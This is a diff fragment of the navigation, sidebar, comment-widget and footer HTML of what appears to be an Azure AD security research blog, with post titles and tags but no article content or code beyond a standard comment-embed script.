+		<a class="post-nav__link" href="/post/devices/" rel="prev"><span class="post-nav__caption">«Previous</span><p class="post-nav__post-title">Deep-dive to Azure AD device join</p></a>
+	</div>
+	<div class="post-nav__item post-nav__item--next col-1-2">
+		<a class="post-nav__link" href="/post/hybridhealthagent/" rel="next"><span class="post-nav__caption">Next»</span><p class="post-nav__post-title">Spoofing Azure AD sign-ins logs by imitating AD FS Hybrid Health Agent</p></a>
+	</div>
+</nav>
+
+	
+<div class="comments">
+	<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "o365blog-com" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+</main>
+
+<aside class="sidebar" itemscope="itemscope" itemtype="http://schema.org/WPSideBar">
+	
+<div class="widget-search widget">
+	<form class="widget-search__form" role="search" method="get" action="//google.com/search">
+		<label>
+			<span class="screen-reader-text">Search for:</span>
+			<input class="widget-search__field" type="search" placeholder="SEARCH..." value="" name="q">
+		</label>
+		<input class="widget-search__submit" type="submit" value="Search">
+		<input type="hidden" name="sitesearch" value="http://o365blog.com" />
+	</form>
+</div>
+	
+<div class="widget-recent widget">
+	<h4 class="widget__title">Recent Posts</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/post/pta/">Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/gmsa/">Hunt for the gMSA secrets</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/august_2022/">AADInternals World Tour August 2022: USA</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/deviceidentity/">Stealing and faking Azure AD device identities</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/partners/">Microsoft partners: The Good, The Bad, or The Ugly?</a></li>
+		</ul>
+	</div>
+</div>
+
+	
+<div class="widget-categories widget">
+	<h4 class="widget__title">Categories</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/categories/"></a></li>
+			<li class="widget__item"><a class="widget__link" href="/categories/article">Article</a></li>
+			<li class="widget__item"><a class="widget__link" href="/categories/blog">Blog</a></li>
+		</ul>
+	</div>
+</div>
+	
+<div class="widget-social widget">
+	<h4 class="widget-social__title widget__title">Social</h4>
+	<div class="widget-social__content widget__content">
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="Twitter" rel="noopener noreferrer" href="https://twitter.com/DrAzureAD" target="_blank">
+				<svg class="widget-social__link-icon icon-twitter" viewBox="0 0 384 312" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m384 36.9c-14.1 6.3-29.3 10.5-45.2 12.4 16.3-9.7 28.8-25.2 34.6-43.6-15.2 9-32.1 15.6-50 19.1-14.4-15.2-34.9-24.8-57.5-24.8-43.5 0-78.8 35.3-78.8 78.8 0 6.2.7 12.2 2 17.9-65.5-3.3-123.5-34.6-162.4-82.3-6.7 11.6-10.6 25.2-10.6 39.6 0 27.3 13.9 51.4 35 65.6-12.9-.4-25.1-4-35.7-9.9v1c0 38.2 27.2 70 63.2 77.2-6.6 1.8-13.6 2.8-20.8 2.8-5.1 0-10-.5-14.8-1.4 10 31.3 39.1 54.1 73.6 54.7-27 21.1-60.9 33.7-97.8 33.7-6.4 0-12.6-.4-18.8-1.1 34.9 22.4 76.3 35.4 120.8 35.4 144.9 0 224.1-120 224.1-224.1 0-3.4-.1-6.8-.2-10.2 15.4-11.1 28.7-25 39.3-40.8z"/></svg>
+				<span>Twitter</span>
+			</a>
+		</div>
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="" rel="noopener noreferrer" href="https://linkedin.com/in/nestori" target="_blank">
+				<svg class="widget-social__link-icon icon-linkedin" viewBox="0 0 352 352" width="24" height="24" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M0,40v272c0,21.9,18.1,40,40,40h272c21.9,0,40-18.1,40-40V40c0-21.9-18.1-40-40-40H40C18.1,0,0,18.1,0,40z M312,32 c4.6,0,8,3.4,8,8v272c0,4.6-3.4,8-8,8H40c-4.6,0-8-3.4-8-8V40c0-4.6,3.4-8,8-8H312z M59.5,87c0,15.2,12.3,27.5,27.5,27.5 c15.2,0,27.5-12.3,27.5-27.5c0-15.2-12.3-27.5-27.5-27.5C71.8,59.5,59.5,71.8,59.5,87z M187,157h-1v-21h-45v152h47v-75 c0-19.8,3.9-39,28.5-39c24.2,0,24.5,22.4,24.5,40v74h47v-83.5c0-40.9-8.7-72-56.5-72C208.5,132.5,193.3,145.1,187,157z M64,288h47.5 V136H64V288z"/></svg>
+				<span>LinkedIn</span>
+			</a>
+		</div>
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="Email" href="mailto:nestori.syynimaa@gerenios.com">
+				<svg class="widget-social__link-icon icon-mail" viewBox="0 0 416 288" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m0 16v256 16h16 384 16v-16-256-16h-16-384-16zm347 16-139 92.5-139-92.5zm-148 125.5 9 5.5 9-5.5 167-111.5v210h-352v-210z"/></svg>
+				<span>nestori.syynimaa@gerenios.com</span>
+			</a>
+		</div>
+	</div>
+</div>
+
+	
+<div class="widget-taglist widget">
+	<h4 class="widget__title">Tags</h4>
+	<div class="widget__content">
+		<a class="widget__link widget__link--taglist" href="/tags/aadconnect" title="aadconnect">aadconnect (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/aadinternals" title="aadinternals">aadinternals (10)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/abusing" title="abusing">abusing (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/active-directory" title="active-directory">active-directory (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/adfs" title="adfs">adfs (5)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/admin" title="admin">admin (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/administration" title="administration">administration (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/authentication" title="authentication">authentication (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/azure" title="azure">azure (20)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/azure-active-directory" title="azure-active-directory">azure-active-directory (27)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/azuread" title="azuread">azuread (4)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/backdoor" title="backdoor">backdoor (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/blackhat" title="blackhat">blackhat (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/blue-team" title="blue-team">blue-team (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/bprt" title="bprt">bprt (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/browser" title="browser">browser (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/compromise" title="compromise">compromise (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/conferences" title="conferences">conferences (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/defcon" title="defcon">defcon (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/desktop-sso" title="desktop-sso">desktop-sso (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/device" title="device">device (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/dns" title="dns">dns (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/email" title="email">email (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/encryption" title="encryption">encryption (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/exchange" title="exchange">exchange (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/federation" title="federation">federation (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/forensics" title="forensics">forensics (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/gdpr" title="gdpr">gdpr (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/global-administrator" title="global-administrator">global-administrator (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/graph" title="graph">graph (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/groups" title="groups">groups (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/guest" title="guest">guest (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/hybrid-join" title="hybrid-join">hybrid-join (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/identity" title="identity">identity (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/inactive" title="inactive">inactive (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/insider" title="insider">insider (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/intune" title="intune">intune (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/join" title="join">join (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/logs" title="logs">logs (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/mailbox" title="mailbox">mailbox (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/mdm" title="mdm">mdm (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/mfa" title="mfa">mfa (6)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/office-365" title="office-365">office-365 (9)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/office365" title="office365">office365 (9)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/on-prem" title="on-prem">on-prem (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/onedrive" title="onedrive">onedrive (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/outsider" title="outsider">outsider (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/partner" title="partner">partner (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/password" title="password">password (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/persistence" title="persistence">persistence (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/phishing" title="phishing">phishing (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/planner" title="planner">planner (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/powershell" title="powershell">powershell (13)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/prt" title="prt">prt (6)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/pta" title="pta">pta (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/recon" title="recon">recon (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/reconnaissance" title="reconnaissance">reconnaissance (4)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/seamless-sso" title="seamless-sso">seamless-sso (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/security" title="security">security (31)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/sso" title="sso">sso (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/sync" title="sync">sync (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/synchronisation" title="synchronisation">synchronisation (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/t2" title="t2">t2 (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/talks" title="talks">talks (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/teams" title="teams">teams (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/user" title="user">user (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/virtual-machine" title="virtual-machine">virtual-machine (1)</a>
+	</div>
+</div>
+</aside>
+
+	</div>
+		<footer class="footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
+			<div class="container container-inner">
+				<p class="footer__copyright"><span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank"><img src="/images/CC-BY.png"></a> </span></p>
+			</div>
+		</footer>
+	</div>
+
+<script>
+	var navigation = responsiveNav(".menu", {
+		navClass: "menu--collapse",
+	});
+</script>
+</body>
+</html>
